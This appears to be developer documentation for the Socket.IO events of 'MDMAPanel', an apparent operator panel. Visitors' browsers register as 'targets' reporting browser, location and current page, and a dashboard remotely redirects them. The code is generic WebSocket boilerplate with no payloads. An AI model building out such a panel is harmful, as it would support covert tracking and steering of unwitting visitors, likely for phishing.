# WebSocket Events Documentation

## Overview

MDMAPanel uses Socket.IO for real-time communication between clients and the server. This document details all available WebSocket events and their usage.

## Connection Setup

### Client Configuration
```javascript
import { io } from 'socket.io-client';

const socket = io('http://localhost:3000', {
  auth: {
    token: 'your_jwt_token'
  },
  autoConnect: true,
  reconnection: true,
  reconnectionAttempts: 5
});
```

### Server Configuration
```javascript
const io = new Server(server, {
  cors: {
    origin: process.env.WS_CORS_ORIGIN,
    methods: ['GET', 'POST']
  },
  pingTimeout: 30000,
  pingInterval: 10000
});
```

## Authentication

### JWT Authentication
```javascript
// Server-side authentication middleware
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  try {
    const decoded = jwt.verify(token, process.env.JWT_SECRET);
    socket.user = decoded;
    next();
  } catch (err) {
    next(new Error('Authentication failed'));
  }
});
```

## Events

### Target Events

#### Target Identification
```javascript
// Client emit
socket.emit('identify', {
  belongsto: 'username',
  browser: 'Chrome',
  location: 'US',
  currentPage: 'account_review'
});

// Server response
socket.on('identified', ({ targetID, start_page }) => {
  console.log(`Identified as target: ${targetID}`);
});
```

#### Status Updates
```javascript
// Client emit
socket.emit('updateStatus', {
  targetID: 'uuid',
  status: 'Online',
  currentPage: 'account_review'
});

// Server broadcast
io.emit('targetUpdated', {
  targetID: 'uuid',
  status: 'Online',
  currentPage: 'account_review'
});
```

### Dashboard Events

#### Join Dashboard Room
```javascript
// Client emit
socket.emit('joinDashboardRoom', { username: 'admin' });

// Server response
socket.on('roomJoined', (data) => {
  console.log(`Joined room for ${data.username}`);
});
```

#### Target Management
```javascript
// Send command to target
socket.emit('sendActionToTarget', {
  targetID: 'uuid',
  action: 'navigate',
  customUrl: 'https://example.com'
});

// Target receives command
socket.on('action', ({ action, customUrl }) => {
  console.log(`Received action: ${action}`);
});
```

### Guild Events

#### Guild Room Management
```javascript
// Join guild room
socket.emit('joinGuild', { guildId: 'guild_uuid' });

// Guild-wide updates
socket.on('guildUpdate', (data) => {
  console.log('Guild update received:', data);
});
```

## Error Handling

### Connection Errors
```javascript
socket.on('connect_error', (error) => {
  console.error('Connection error:', error);
  // Implement retry logic
});

socket.on('connect_timeout', (timeout) => {
  console.error('Connection timeout:', timeout);
  // Handle timeout
});
```

### Event Errors
```javascript
socket.on('error', (error) => {
  console.error('Socket error:', error);
  // Handle specific error types
});
```

## Reconnection

### Automatic Reconnection
```javascript
const socket = io('http://localhost:3000', {
  reconnection: true,
  reconnectionAttempts: 5,
  reconnectionDelay: 1000,
  reconnectionDelayMax: 5000
});

socket.on('reconnect', (attemptNumber) => {
  console.log(`Reconnected after ${attemptNumber} attempts`);
});

socket.on('reconnect_failed', () => {
  console.error('Failed to reconnect');
});
```

## Room Management

### Join/Leave Rooms
```javascript
// Join room
socket.join(`target:${targetID}`);

// Leave room
socket.leave(`target:${targetID}`);

// Get rooms
const rooms = Array.from(socket.rooms);
```

## Performance Optimization

### Event Batching
```javascript
// Batch multiple updates
const batchUpdates = [];
socket.on('batchUpdate', (updates) => {
  batchUpdates.push(...updates);
  
  // Process batch after delay
  debounce(() => {
    processUpdates(batchUpdates);
    batchUpdates.length = 0;
  }, 100);
});
```

### Connection Pooling
```javascript
// Server-side connection pool
const connectionPool = new Map();

io.on('connection', (socket) => {
  connectionPool.set(socket.id, socket);
  
  socket.on('disconnect', () => {
    connectionPool.delete(socket.id);
  });
});
```

## Security Considerations

### Input Validation
```javascript
const validateEvent = (data) => {
  const schema = Joi.object({
    targetID: Joi.string().uuid().required(),
    action: Joi.string().valid('navigate', 'refresh', 'close').required(),
    customUrl: Joi.string().uri().optional()
  });
  
  return schema.validate(data);
};
```

### Rate Limiting
```javascript
const rateLimiter = new RateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100 // limit each IP to 100 requests per windowMs
});

io.use((socket, next) => {
  rateLimiter(socket.handshake, null, next);
});
```

## Monitoring

### Event Logging
```javascript
// Log all events
socket.onAny((eventName, ...args) => {
  logger.info('Socket Event', {
    event: eventName,
    args,
    socketId: socket.id,
    user: socket.user
  });
});
```

### Performance Metrics
```javascript
const metrics = {
  connections: 0,
  events: new Map(),
  errors: 0
};

io.on('connection', (socket) => {
  metrics.connections++;
  
  socket.onAny((eventName) => {
    const count = metrics.events.get(eventName) || 0;
    metrics.events.set(eventName, count + 1);
  });
});
```

## Best Practices

1. **Event Naming**
   - Use descriptive event names
   - Follow consistent naming convention
   - Document all events

2. **Error Handling**
   - Implement proper error handling
   - Use error events for client notification
   - Log all errors

3. **Performance**
   - Minimize event payload size
   - Use room-based broadcasting
   - Implement connection pooling

4. **Security**
   - Validate all input data
   - Implement rate limiting
   - Use secure connections (WSS)

## Examples

### Target Client
```javascript
class TargetClient {
  constructor(username) {
    this.socket = io('http://localhost:3000');
    this.username = username;
    this.setupEventHandlers();
  }

  setupEventHandlers() {
    this.socket.on('connect', this.handleConnect.bind(this));
    this.socket.on('action', this.handleAction.bind(this));
    this.socket.on('disconnect', this.handleDisconnect.bind(this));
  }

  handleConnect() {
    this.socket.emit('identify', {
      belongsto: this.username,
      browser: navigator.userAgent,
      location: 'US'
    });
  }

  handleAction(data) {
    console.log('Received action:', data);
    // Execute action
  }

  handleDisconnect() {
    console.log('Disconnected from server');
    // Handle reconnection
  }
}
```

### Dashboard Client
```javascript
class DashboardClient {
  constructor(username) {
    this.socket = io('http://localhost:3000');
    this.username = username;
    this.setupEventHandlers();
  }

  setupEventHandlers() {
    this.socket.on('connect', () => {
      this.socket.emit('joinDashboardRoom', { username: this.username });
    });

    this.socket.on('targetUpdated', this.handleTargetUpdate.bind(this));
    this.socket.on('targetAdded', this.handleNewTarget.bind(this));
  }

  sendActionToTarget(targetID, action) {
    this.socket.emit('sendActionToTarget', { targetID, action });
  }

  handleTargetUpdate(data) {
    console.log('Target updated:', data);
    // Update UI
  }

  handleNewTarget(data) {
    console.log('New target:', data);
    // Add target to UI
  }
} 